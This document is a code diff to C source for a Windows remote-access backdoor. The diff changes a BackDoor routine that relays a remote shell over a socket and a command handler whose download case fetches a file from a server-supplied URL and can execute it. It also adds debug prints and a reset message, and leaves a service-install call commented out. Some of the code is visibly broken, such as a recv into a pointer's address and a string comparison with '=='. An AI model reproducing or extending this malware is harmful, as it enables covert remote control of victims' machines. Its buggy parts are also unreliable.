@@ -17,6 +17,7 @@
 #define bool                                   BOOL
 #define ERROR_SUCCESS                           0L
 #define SERVER_HEARTS                           0
+// #define SERVER_HEARTS_SHELL                     13
 #define SERVER_RESET                            1
 #define SERVER_SHELL                            2
 #define SERVER_SHELL_CHANNEL                    3
@@ -43,12 +44,12 @@ SERVICE_STATUS_HANDLE ServiceStatusHandle;
 struct CMSG{
         char sign[10];
         UINT8 mod;//自定义模式
-        UINT8 msg_l;
+        UINT32 msg_l;
 };
 struct CFILE{
     char address[255];
     char save_path[255];
-    int execute;
+    UINT8 execute;
 };
 
 //-----------------------------TOOLKIT FUNCTION START------------------------------------------------
@@ -90,7 +91,7 @@ BOOL http_get(LPCTSTR szURL, LPCTSTR szFileName)
 	return bRet;
 }
 
-DWORD WINAPI DownManager(LPVOID lparam,LPCTSTR save_path,bool execute)
+DWORD WINAPI DownManager(LPVOID lparam,LPCTSTR save_path,UINT8 execute)
 {
 	int	nUrlLength;
 	char	*lpURL = NULL;
@@ -306,13 +307,20 @@ void BackDoor(SOCKET sock){
             struct CMSG msg = {
                 .sign =  "customize",
                 .mod = SERVER_SHELL_CHANNEL,
-                .msg_l = strlen(Buff)
+                .msg_l = lBytesRead
              };
+            printf("SendLen:%d\n,RecvLen:%d\n",strlen(Buff),lBytesRead);
             send(sock,(char*)&msg,sizeof(struct CMSG),0);
             ret=send(sock,Buff+'\0',lBytesRead,0);
             printf("Send:\n%s\nSendEnd\n",Buff);
             ZeroMemory(Buff,1024);
-            if (ret<=0) break; 
+            if (ret<=0) {struct CMSG emsg = {
+                    .sign =  "customize",
+                    .mod = SERVER_RESET,
+                    .msg_l = 0
+                    };
+                    send(sock,(char*)&emsg,sizeof(struct CMSG),0);
+                    break;}; 
         } else { 
             char * address = malloc(sizeof(struct CMSG));
             recv(sock,address,sizeof(struct CMSG),0);
@@ -320,6 +328,7 @@ void BackDoor(SOCKET sock){
             free(address);
             switch (msg.mod){
                 case SERVER_HEARTS:
+                    
                     continue;
                 case SERVER_SHELL_CHANNEL:{
                     lBytesRead=recv(sock,Buff,1024,0);
@@ -421,25 +430,32 @@ void Handle(){
                 continue;
             case SERVER_DOWNLOAD:
                 {
-                    struct CFILE* f_obj;
-                    ret = recv(sock,(char *)f_obj,msg.msg_l,0);
+                    char * address = malloc(sizeof(struct CFILE));
+                    
+
+                    ret = recv(sock,(char *)&address,511,0);
+                    struct CFILE f_obj = *(struct CFILE*)address;
+                    printf("len:%d\n",msg.msg_l);
                     if (ret <= 0){
                         continue;
                     }
-                    if(f_obj->address && f_obj->save_path == "NULL"){
-                        DownManager(f_obj->address,NULL,f_obj->execute);
+                    printf("address:%s\npath:%s\nrun%d\n",f_obj.address,f_obj.save_path,f_obj.execute);
+                    if(f_obj.address && f_obj.save_path == "NULL"){
+                        DownManager(f_obj.address,NULL,f_obj.execute);
                         
                     }else{
-                        DownManager(f_obj->address,f_obj->save_path,f_obj->execute);
+                        DownManager(f_obj.address,f_obj.save_path,f_obj.execute);
                     }
-                    
+                    free(address);
+                    continue;
                 }
-                continue;
+                
             case SERVER_OPENURL:
                 {
                     continue;
                 }
-            
+            case SERVER_SYSTEMINFO:
+                continue;
             
 
         }
@@ -549,7 +565,7 @@ int _stdcall WinMain(
     int nCmdShow
 )
 {
-    
+    //ServiceInstall();
     Handle();
     return 0;
 }
